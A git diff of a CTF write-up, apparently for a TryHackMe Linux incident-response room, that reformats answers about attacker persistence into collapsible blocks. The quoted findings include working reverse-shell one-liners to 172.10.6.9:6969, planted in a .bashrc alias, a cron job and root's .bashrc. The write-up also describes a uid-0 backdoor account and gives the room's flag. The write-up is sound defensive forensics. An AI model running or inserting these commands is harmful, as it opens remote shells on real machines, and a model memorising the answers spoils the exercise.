@@ -24,9 +24,10 @@ After connected to the compromised machine via SSH, we can use either of these c
 - `lsb_release -a`
 - `uname -a`
 
-```
-Ubuntu 20.04.4 LTS
-```
+<details>
+  <summary>Answer</summary>
+<pre><code>Ubuntu 20.04.4 LTS</code></pre>
+</details>
 
 * * *
 ## Investigating the giorgio account
@@ -42,9 +43,10 @@ First thing we could do when investigate malware residing on the home directory 
 
 By using `file` utility, we can see that this file is ELF file so its a standard binary to be executed on Linux and this file appears to be the answer of this question as well.
 
-```
-.bad_bash
-```
+<details>
+  <summary>Answer</summary>
+<pre><code>.bad_bash</code></pre>
+</details>
 
 >In every investigation, it's important to keep a dirty wordlist to keep track of all your findings, no matter how small. It's also a way to prevent going back in circles and starting from scratch again. As such, now's a good time to create one and put the previous answer as an entry so we can go back to it later. <br>
 Another file that can be found in every user's home directory is the .bashrc file. Can you check if you can find something interesting in giorgio's .bashrc?
@@ -53,9 +55,10 @@ Another file that can be found in every user's home directory is the .bashrc fil
 
 `.bashrc` file is a script file that executed when respective user login which contains a lot of configuration, alias and can be abused to add persistence shell command within it and seem like we have one in this case as well, the attacker set alias for `ls` command to execute reverse shell command to 172.10.6.9 on port 6969.
 
-```
-ls='(bash -i >& /dev/tcp/172.10.6.9/6969 0>&1 & disown) 2>/dev/null; ls --color=auto'
-```
+<details>
+  <summary>Answer</summary>
+<pre><code>ls='(bash -i &gt;&amp; /dev/tcp/172.10.6.9/6969 0&gt;&amp;1 &amp; disown) 2&gt;/dev/null; ls --color=auto'</code></pre>
+</details>
 
 >It seems we've covered the usual bases in giorgio's home directory, so it's time to check the scheduled tasks that he owns.<br>
 Did you find anything interesting about scheduled tasks?
@@ -64,9 +67,10 @@ Did you find anything interesting about scheduled tasks?
 
 Another popular persistence mechanism on Linux is cronjob which we can use `crontab -l` to list cronjob own by respective user who executed the command and in this case, we can see that there is an another reverse shell script being executed every minute to the same IP address and port from previous question.
 
-```
-/usr/bin/rm /tmp/f;/usr/bin/mkfifo /tmp/f;/usr/bin/cat /tmp/f|/bin/sh -i 2>&1|/usr/bin/nc 172.10.6.9 6969 >/tmp/f
-```
+<details>
+  <summary>Answer</summary>
+<pre><code>/usr/bin/rm /tmp/f;/usr/bin/mkfifo /tmp/f;/usr/bin/cat /tmp/f|/bin/sh -i 2&gt;&amp;1|/usr/bin/nc 172.10.6.9 6969 &gt;/tmp/f</code></pre>
+</details>
 
 * * *
 ## Investigating the root account
@@ -79,9 +83,10 @@ What does it say?
 
 By running `sudo -l`, we can see that current user is capable to execute any command as root so we can switch to root user with `sudo su` and then as soon as we entered root shell, and error message displayed as seen in the image above. and this error exclusively has something to do with `ncat` so its likely to be another persistence mechanism to execute reverse shell as root.
 
-```
-Ncat: TIMEOUT.
-```
+<details>
+  <summary>Answer</summary>
+<pre><code>Ncat: TIMEOUT.</code></pre>
+</details>
 
 >After moving forward with the error message, a suspicious command appears in the terminal as part of the error message. <br>
 What command was displayed?
@@ -90,9 +95,10 @@ What command was displayed?
 
 After typing "Enter", we can see the command that triggered the error and we confirmed that this is the reverse shell command that will connect to the same IP address we found earlier. 
 
-```
-ncat -e /bin/bash 172.10.6.9 6969
-```
+<details>
+  <summary>Answer</summary>
+<pre><code>ncat -e /bin/bash 172.10.6.9 6969</code></pre>
+</details>
 
 >You might wonder, "how did that happen? I didn't even do anything? I just logged as root, and it happened." <br>
 Can you find out how the suspicious command has been implemented?
@@ -101,9 +107,10 @@ Can you find out how the suspicious command has been implemented?
 
 When switch user to root, the behavior is likely to be the same as login and the persistence mechanism that can be triggered via login on each user is `.bashrc` which we can see that there is the same command we found from the previous question reside on the `.bashrc` of root user. 
 
-```
-.bashrc
-```
+<details>
+  <summary>Answer</summary>
+<pre><code>.bashrc</code></pre>
+</details>
 
 * * *
 ## Investigating the system
@@ -118,9 +125,10 @@ What is the last persistence mechanism?
 
 Since there is no SSH public key backdoor and cronjob as root found, I checked all users from `/etc/passwd` which I found that there is another user with has the same uid as root which mean this user is another root user on this machine and it just happened to be the backdoor user and the last persistence mechanism we are looking for.
 
-```
-nobody
-```
+<details>
+  <summary>Answer</summary>
+<pre><code>nobody</code></pre>
+</details>
 
 * * *
 ## Final Thoughts
@@ -136,9 +144,10 @@ What is the nugget?
 
 From the previous result (`/etc/passwd`), we found that the home directory of nobody user is `/nonexistence` so I went to this directory and list all the files which there is 1 hidden file that really stand out here that contains a flag so we can display the content of this file with `cat` directly.
 
-```
-THM{Nob0dy_1s_s@f3}
-```
+<details>
+  <summary>Answer</summary>
+<pre><code>THM{Nob0dy_1s_s@f3}</code></pre>
+</details>
 
 ![f6fac30d86db78725cde01455aaae920.png](/resources/f6fac30d86db78725cde01455aaae920.png)
 
